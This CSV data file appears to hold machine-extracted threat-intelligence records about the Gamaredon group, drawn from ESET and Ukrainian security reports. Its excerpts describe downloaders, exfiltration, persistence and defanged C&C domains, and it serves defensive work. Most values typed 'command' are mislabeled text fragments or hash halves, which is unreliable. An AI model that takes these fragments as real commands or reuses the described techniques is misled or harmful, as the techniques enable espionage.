schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--gamaredon,artifact--sha256:0375cacba62401d96db23b585b3ed0578b509ffef4cc53a332c086006a25398b,observation--sha256:14f0cfb103da453ac1f4d97b345b855fe9a3f43e0512bc5fe76e6b8c46edcb35,command,F33F786641F0BE823BE8 N/A PowerShell/Pterodo.BY PteroPSDoor variant 2 version 7111.,F33F786641F0BE823BE8 N/A PowerShell/Pterodo.BY PteroPSDoor variant 2 version 7111,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:467b9e987b1838c89bff19fa0cc43135d0a5235e9ff294eac036b34cab3d3a4e,observation--sha256:caf2f25dd7ce5f13d66a428b05bdcf9972068ade42e6774f7f45928f28140351,command,F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell,F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:bdafebdba45f0010b07977e888a1a6f90dcd9bd6563dc6d5885d3e48c0c43dec,observation--sha256:610edb2448b1c2fb0be7ee221bc4a232fed77f099dcb95e47cb22d3aa02f2836,command,F7A3B876427CDF276473 N/A PowerShell/Pterodo.GA Downloader of PteroCookie.,F7A3B876427CDF276473 N/A PowerShell/Pterodo.GA Downloader of PteroCookie,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:0faeae097e67d0b97f5bf65143089a121521b5ad56d59501f1f0fe3256080255,observation--sha256:6f8bbcf04ce56338a4fb04ad83cbfe53e49a67caff8c792d62b682c287f3cb46,command,F8A12FF5995DD24CD259 N/A PowerShell/Pterodo.GN PowerShell version of PteroLNK – USB,F8A12FF5995DD24CD259 N/A PowerShell/Pterodo.GN PowerShell version of PteroLNK – USB,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:2b4d4b37cb4b583d76373d7ec27457df57422c95c049f291b467137a83f08490,observation--sha256:eec3308db10569e75f6c3eb27f1c6817b7d10e09d775b50cbc30047c6d3bdadf,command,Figure 10. PowerShell script example with C#,Figure 10. PowerShell script example with C#,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 10. PowerShell script example with C#,
1.0.0,actor--gamaredon,artifact--sha256:fa6fcc2efd1f534e21098ef30b60ab2366e34a4a8aad0a4831756a7f2016972a,observation--sha256:d85d4775924472bd8c0f672cc01f33411badd38adb8ee845acf844b365de684a,command,Figure 9. PowerShell script example,Figure 9. PowerShell script example,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"PowerShell The Security Service of Ukraine has detected Armageddon using two types of PowerShell scripts. One of them is designed to obtain information about the user and the information system, sending it to the command & control server, loading in response an additional module – the executable file with its simultaneous hidden start (Figure 9). Figure 9. PowerShell script example Another script file contained 4039 lines of program code. At the same time, PowerShell commands were actually inten",
1.0.0,actor--gamaredon,artifact--sha256:55078cbc374ff3c3630f7e7599dbebefcaa02a6fba8d91dee5f63174628fbe28,observation--sha256:90a981bca944699447ae1b5b44b7a8458cbf86a31d51b0de762d0d19f81d7d99,command,"For persistence, PteroPSDoor establishes a scheduled task that runs a brief PowerShell script,","For persistence, PteroPSDoor establishes a scheduled task that runs a brief PowerShell script",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"26 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 In addition to file stealing, PteroPSDoor has a feature where every file uploaded to the C&C server can trigger a payload response. This payload, either a PE file or VBScript, is parsed, dr opped to %TEMP% with a random filename, and executed. To regularly receive payloads, PteroPSDoor creates a file with random content in a dedicated directory before exfiltrating staged files. This ensures it always",
1.0.0,actor--gamaredon,artifact--sha256:143030c044244289c877e412447b80b87ec94aeeb03c508fce3ea1cfbd424224,observation--sha256:5242e251012af123fe81254b78d247c0fe3f188504dc26f3c04c7264fea0679a,command,"For persistence, a short PowerShell script is added u nder the HKCU Run key that , upon its own","For persistence, a short PowerShell script is added u nder the HKCU Run key that , upon its own",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:20064d49185ccd8d4fb620f5c92fdd885444eb96ae75558cb9140d04a9da37e0,observation--sha256:9eed8acf56355530a564727857a6751863761cb92bd51bfb0cd7d07deee6f917,command,Gamaredon uses PowerShell to execute,Gamaredon uses PowerShell to execute,candidate,2023-12-04T00:00:00Z,day,known,same-record,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,47 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IP Domain Hosting provider First seen Details N/A loturam[.]ru N/A 2023-12-04 Gamaredon C&C server. N/A nikortal[.]ru N/A 2023-12-06 Gamaredon C&C server. N/A nododru[.]ru N/A 2023-12-20 Gamaredon C&C server. 62.133.62[.]73 N/A GLOBAL INTERNET SOLUTIONS LLC 2023-12-20 Gamaredon C&C server. MITRE ATT&CK TECHNIQUES This table was built usin g version 15 of the MITRE ATT&CK framework . Tactic ID Name De,
1.0.0,actor--gamaredon,artifact--sha256:20064d49185ccd8d4fb620f5c92fdd885444eb96ae75558cb9140d04a9da37e0,observation--sha256:2db4b93774492c5c60407dde4d1be1b90a4f35408cf5a06fbdb3e45b0e787a63,command,Gamaredon uses PowerShell to execute,Gamaredon uses PowerShell to execute,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"34 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances MITRE ATT&CK TECHNIQUES This table was built using version 1 9 of the MITRE ATT&CK framework. Tactic ID Name Description Resource Development T1583.001 Acquire Infrastructure: Domains Gamaredon registers domains for its C&C servers. T1583.003 Acquire Infrastructure: Virtual Private Server Gamaredon rents servers for its C&C infrastructure. T1583.007 Acquire Infrastructure: Serverless Gamaredon hides its C&C infrastr",
1.0.0,actor--gamaredon,artifact--sha256:126dcd998a35c40f0e44e1a3670cd6e88c22d9aeda51ed1602f26b69681d1c88,observation--sha256:8eb162ec0044a4011a905a2114eb8bfc52e813e4df91cf984662b449298f752d,command,Gamaredon uses mshta.exe to execute,Gamaredon uses mshta.exe to execute,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 50}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,49 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tactic ID Name Description T1564.001 Hide Artifacts: Hidden Files and Directories PteroLNK creates hidden files. T1562.001 Impair Defenses: Disable or Modify Tools PteroSocks disables AMSI by calling the method AmsiUtils.Uninitialize . T1070.004 Indicator Removal: File Deletion PteroPSDoor deletes staged files after successful exfiltration. T1036.004 Masquerading: Masquerade Task or Service Gamaredon,
1.0.0,actor--gamaredon,artifact--sha256:126dcd998a35c40f0e44e1a3670cd6e88c22d9aeda51ed1602f26b69681d1c88,observation--sha256:865eed01b67718eeca7ab4e66eee64f29391cc0dbeecd79fe2b6c3c98c83c265,command,Gamaredon uses mshta.exe to execute,Gamaredon uses mshta.exe to execute,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"37 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1027.015 Obfuscated Files or Information: Compression Gamaredon uses, in its spearphishing campaigns, bzip2 -compressed HTA files, and HTA files packed in ZIP and RAR archives. T1027.016 Obfuscated Files or Information: Junk Code Insertion Gamaredon inserts junk code into its malicious tools. T1684.001 Social Engineering: Impersonation Gamaredon sends spearphishing emails impersonating Uk",
1.0.0,actor--gamaredon,artifact--sha256:ba1ede549d3a1a3251de5e00f24defd3862c5d71c990c3ae9e4caaad72139cfa,observation--sha256:ab899ab121da9b9c2df0f1b5e14c0d95a6ad965f3e51f88caed1b05c605baaaf,command,"Gamaredon ’s dedicated downloaders, which can be VBScripts or PowerShell scripts in VBScript","Gamaredon ’s dedicated downloaders, which can be VBScripts or PowerShell scripts in VBScript",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 · a remote template that has been downloaded by a Word document weaponized by PteroTemplate, and · a default Word template ( Normal.dotm ) weaponized by PteroTemplate. The process of weaponizing Word documents and templates is described in detail in the respective sections of the PteroDoc and PteroTemplate sections. Note that the downloader is only dropped when the documents are closed, which trigger",
1.0.0,actor--gamaredon,artifact--sha256:f102d946fd282522627785437ed57691b50f673724acd83b02b18d9e84bf1ef1,observation--sha256:47ab72e3f09ac8cd62b08c2dd06ee930af2a2978d634c821019192bcd81cae54,command,"HKCU\Software\Microsoft\Windows\CurrentVersion \Run, which contains a short PowerShell","HKCU\Software\Microsoft\Windows\CurrentVersion \Run, which contains a short PowerShell",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Firstly, PteroPSLoad resolves the C&C server ’s IP address from the hardcoded domain by querying the default system DNS. Secondly, it uses that IP address to send an HTTP GET request with the /get.php URI to its C&C server to fetch its updated version . Thirdly, it ensures the persistence of the downloaded update by creating an HKCU Run value that will execute it upon every system start, serving as b",
1.0.0,actor--gamaredon,artifact--sha256:0df438b70ac2b497b8fa28157940ae8e5c442f967bf08d4c338a6ee1b9842d2f,observation--sha256:ff02fcc27b40e22fbd5768555c13b97c97bb3e6742d25ac64d2f8feef51ad1a8,command,"If the content starts with the ! character, it’s treated as a PowerShell command and executed via","If the content starts with the ! character, it’s treated as a PowerShell command and executed via",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:9f3460ce30ef463731c505cd3bc86df837fbb6f3fc5faf372e034b568cda23f2,observation--sha256:eaed9cfae735693a672cd439445a2c1d58819ad96a0e21bca938fd0b26a8e6cf,command,"If the primary exfiltration method fails, PteroPSDoor retries via Tor using curl.exe and curl’s SOCKS5","If the primary exfiltration method fails, PteroPSDoor retries via Tor using curl.exe and curl’s SOCKS5",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"24 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Capabilities PteroPSDoor’s main goal is to search all mapped drives for files with specific extensions, and subsequently exfiltrate such files to C&C servers or cloud storage accounts operated by Gamaredon. On March 1st, 2025, PteroPSDoor received quite an interesting update , in which Gamaredon added several fallback methods – probably to overcome network -based blocking. First, Gamaredon added a fallback upload me",
1.0.0,actor--gamaredon,artifact--sha256:10a0a7d86df88e79a86125a8155a7cdc7d0b48c82bfa6ca95408838c92a5d119,observation--sha256:025e6a2bd77da33bb648ba85fda0e1989a9969da79fa89fe4ced8f0106fcdfff,command,"In 2022, the trend slowly started to shift towards the use of VBScript and PowerShell in tandem, and","In 2022, the trend slowly started to shift towards the use of VBScript and PowerShell in tandem, and",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"3 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 deploying multiple simple downloaders or backdoors simultaneously. The lack of sophistication of Gamaredon t ools is compensated by frequent updates and use of regularly changing obfuscation. In the past, Gamaredon used numerous downloaders and various tools to move laterally within infiltrated systems. Its ultimate payload was a file stealer, whose main goal was to look for files with specific file e",
1.0.0,actor--gamaredon,artifact--sha256:1af1ac62d77d7fa68d7210b0b1e82090ea887aca54b5d01e555082c284eccf5f,observation--sha256:69837d30b7ca3cddad6f553c948956147db5853318ec0b205b1e0579125777a5,command,In August 2023 we discovered a PowerShell infostealer (SHA -1:,In August 2023 we discovered a PowerShell infostealer (SHA -1:,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:93fbd058d3149a63641582681cad2ac1be4d4d6230b368da957eb5694f846c5b,observation--sha256:025dad2076bee341930eb6ec566423855af8a36680159e56546da4e4fb7d4cec,command,"In fact, the first stage now lies in downloading the WGET","In fact, the first stage now lies in downloading the WGET",candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"However, it should be noted that only about 200 lines of code are actually functional. All other lines are generated only for distraction, which can be attributed to the program code obfuscation technic. In fact, the first stage now lies in downloading the WGET console utility and scripts to run it, set up persistence fo r rebooting by making changes to the registry and/or task scheduler, as well as collecting information about the system (computer name, disk name, IP -address, login and passwor",
1.0.0,actor--gamaredon,artifact--sha256:7635e77527e159b788a0d3c36c8696c4438c867197177e9f7fc7842e7d95dc46,observation--sha256:7ef1f9a29dff49fbb6b3ded3cecc1346b670b453e20c51ea5eb21aa63b94bfa3,command,Malware has used rundll32 to launch,Malware has used rundll32 to launch,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,HKCU\Software\Microsoft\Office\<versio n>\<product>\Security\AccessVBOM T1036 Masquerading Group places components into Windows folder with names mimicking common system services or drivers T1221 Template Injection DOCX files contain a request body to download malicious DOT document templates T1497 .002 Virtualization/Sandbox Evasion Malware pings for DNS servers and checks for launched processes. Also try to identify sandbox name and compare it with hardcoded namelist T1218 .011 Signed Binary P,
1.0.0,actor--gamaredon,artifact--sha256:3b0ac955d291a959b144bbcc9754127daee6409b62093f908544da41390168d1,observation--sha256:fa33471fb75b83d41ee9efd33ff573d58a3a6bb8dbf2e3c01e3e2454f453a4fc,command,"Moreover, built -in downloaders of PteroScreen and the PowerShell version of PteroLNK can also r eceive","Moreover, built -in downloaders of PteroScreen and the PowerShell version of PteroLNK can also r eceive",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 · a remote template that has been downloaded by a Word document weaponized by PteroTemplate, and · a default Word template ( Normal.dotm ) weaponized by PteroTemplate. The process of weaponizing Word documents and templates is described in detail in the respective sections of the PteroDoc and PteroTemplate sections. Note that the downloader is only dropped when the documents are closed, which trigger",
1.0.0,actor--gamaredon,artifact--sha256:5a61d8cfc75701ad66b2f72d80b2f3b9aab652e302d433310eca982c3942a65e,observation--sha256:3197a0b11a0d8d01f468c9e0d039a0a893ea75a9109749eae96ef705453f0902,command,"On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed","On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"15 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances This header is used to upload the contents of the registry value HKLM\SOFTWARE \Microsoft \Cryptography \MachineGuid , which serves as a victim identifier. PteroOdd On February 27th, 2025, we discovered PteroOdd – a tiny PowerShell downloader that had been deployed by PteroGraphin (see our Gamaredon 2024 white paper ). PteroOdd, as shown in Figure 10, retrieves one PowerShell payload via the Telegra.ph API , and run",
1.0.0,actor--gamaredon,artifact--sha256:180afd86b2a37ccebed30ff61b7b089d64ddebc2b142b788fc3e0e82c7e26901,observation--sha256:88bbfb9d45aa6bdc2a1a2b1c8244ea4f41b9dab1d9aa62a38629e073918a5ca4,command,"Once PteroPaste is installed, the runner component is launched in a separate PowerShell process.","Once PteroPaste is installed, the runner component is launched in a separate PowerShell process",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"11 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances • a downloader, • an embedded weaponizer, and • an embedded runner. The downloader is created from an embedded template and regularly retriev es payloads from dead drops. Later instances retrieve payloads from C&C servers hidden behind tunnel services, not from dead drops. Most PteroPaste payloads seen in ESET telemetry were instances of PteroEffigy , described in a later section. The rest were Turla PowerShell payl",
1.0.0,actor--gamaredon,artifact--sha256:8de40028d12249c8afb553ef6a958bf814219ac49f220c0af49376958ee6a8cb,observation--sha256:10565235d563dee090f841a5e472006639fb882f122b095197ea6f192675cb61,command,"Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the","Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"17 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 12. PteroCache (prettified) Capabilities Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the Gamaredon tools. Some instances we observed were able to deploy an unlimited number of payloads, while some could deploy only up to 10 payloads. Network protocol For communication with its C&C server, PteroCache uses an HTTP GET request with the HTTP header x - cache, in whic",
1.0.0,actor--gamaredon,artifact--sha256:42fd5ffba30482c4604631add2699560e088164881a76534771e6f35cbd61fdf,observation--sha256:cce7c6ae2127992ff421f2678c1241c89f5e01f3c571c05fc23d2763757a9d51,command,Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to,Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:cc7d5937ff7b57a2360f87f0d0f5e16e1d4869d2037008776e76f03cc7382c18,command,PowerShell,PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"PowerShell The Security Service of Ukraine has detected Armageddon using two types of PowerShell scripts. One of them is designed to obtain information about the user and the information system, sending it to the command & control server, loading in response an additional module – the executable file with its simultaneous hidden start (Figure 9). Figure 9. PowerShell script example Another script file contained 4039 lines of program code. At the same time, PowerShell commands were actually inten",
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:8141125ae215b60c34b45450192c90859617dc9a757d15a39de445e1ea72abf3,command,PowerShell,PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 General -purpose downloaders We recognize eight types of general -purpose downloaders: five standalone and three built -in. Standalone downloaders primarily deliver payloads, whereas built -in dow nloaders have other primary capabilities but can also deliver payloads. PteroPSLoad PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is deployed, it remains pe",
1.0.0,actor--gamaredon,artifact--sha256:8c84ec20ea45ece057ca1474872c5e878645e493b5dc13ccb515247176d01975,observation--sha256:2c804a29b13e1641bdab70ed41bc8e57ba95ec1ddc2f7794cab9036555db1bec,command,PowerShell,PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
